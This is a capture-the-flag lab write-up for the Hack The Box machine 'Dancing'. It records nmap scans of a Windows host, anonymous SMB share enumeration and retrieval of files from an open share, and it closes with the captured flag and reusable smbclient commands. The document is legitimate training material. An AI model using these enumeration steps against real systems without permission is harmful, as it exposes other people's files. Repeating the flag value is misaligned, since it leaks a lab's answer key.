# Target: Dancing

- IP Address: 10.129.99.59
- Starting Domain Name: target.htb

## Scope & Goal
- Objective: flag.txt
- Constraints: lab

# Recon
- Quick TCP:

```bash
$ nmap target.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 23:08 -0500
Nmap scan report for target.htb (10.129.99.59)
Host is up (0.072s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

- Targeted Scan:

```bash
$ nmap target.htb -sV -sC -A -p135,139,445,5985 -vv
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 23:12 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:12, 0.00s elapsed
Initiating Ping Scan at 23:12
Scanning target.htb (10.129.99.59) [4 ports]
Completed Ping Scan at 23:12, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:12
Scanning target.htb (10.129.99.59) [4 ports]
Discovered open port 5985/tcp on 10.129.99.59
Discovered open port 445/tcp on 10.129.99.59
Discovered open port 135/tcp on 10.129.99.59
Discovered open port 139/tcp on 10.129.99.59
Completed SYN Stealth Scan at 23:12, 0.12s elapsed (4 total ports)
Initiating Service scan at 23:12
Scanning 4 services on target.htb (10.129.99.59)
Completed Service scan at 23:12, 11.73s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against target.htb (10.129.99.59)
Retrying OS detection (try #2) against target.htb (10.129.99.59)
Initiating Traceroute at 23:12
Completed Traceroute at 23:12, 0.17s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:12
Completed Parallel DNS resolution of 1 host. at 23:12, 0.58s elapsed
NSE: Script scanning 10.129.99.59.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:12
Completed NSE at 23:13, 8.71s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
Nmap scan report for target.htb (10.129.99.59)
Host is up, received reset ttl 127 (0.083s latency).
Scanned at 2026-04-08 23:12:37 CDT for 26s

PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/8%OT=135%CT=%CU=43254%PV=Y%DS=2%DC=T%G=N%TM=69D7274F%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56806/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17069/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48230/udp): CLEAN (Timeout)
|   Check 4 (port 54263/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-09T08:12:58
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   151.43 ms 10.10.14.1
2   151.65 ms target.htb (10.129.99.59)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:13
Completed NSE at 23:13, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
           Raw packets sent: 54 (3.828KB) | Rcvd: 49 (3.300KB)
```

## Open Services
- 139/smb

## SMB Enum
- Tech: Microsoft Windows netbios-ssn
- Anonymous Shares:

```bash
$ smbclient -N -L //target.htb   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to target.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

WorkShares looks like a promising share. I will try to pillage it.

- Pillage WorkShares Share:

```bash
$ smbclient //target.htb/WorkShares
Password for [WORKGROUP\kwmd]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

                5114111 blocks of size 4096. 1749500 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 04:08:24 2021
  ..                                  D        0  Mon Mar 29 04:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 06:00:37 2021

                5114111 blocks of size 4096. 1749473 blocks available
smb: \Amy.J\> get worknotes.txt /dev/fd/1
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing getting file \Amy.J\worknotes.txt of size 94 as /dev/fd/1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021

                5114111 blocks of size 4096. 1749473 blocks available
smb: \James.P\> get flag.txt /dev/fd/1
5f61c10dffbc77a704d76016a22f1664getting file \James.P\flag.txt of size 32 as /dev/fd/1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

## Flags
- flag.txt: `5f61c10dffbc77a704d76016a22f1664` (Thu Apr  9 04:28:36 AM UTC 2026)

## Lessons
- What Worked: Nmap scan, smb enumeration
- Reusable Commands:

```bash
smbclient -N -L //target.htb

smbclient //target.htb/WorkShares

get worknotes.txt /dev/fd/1
```
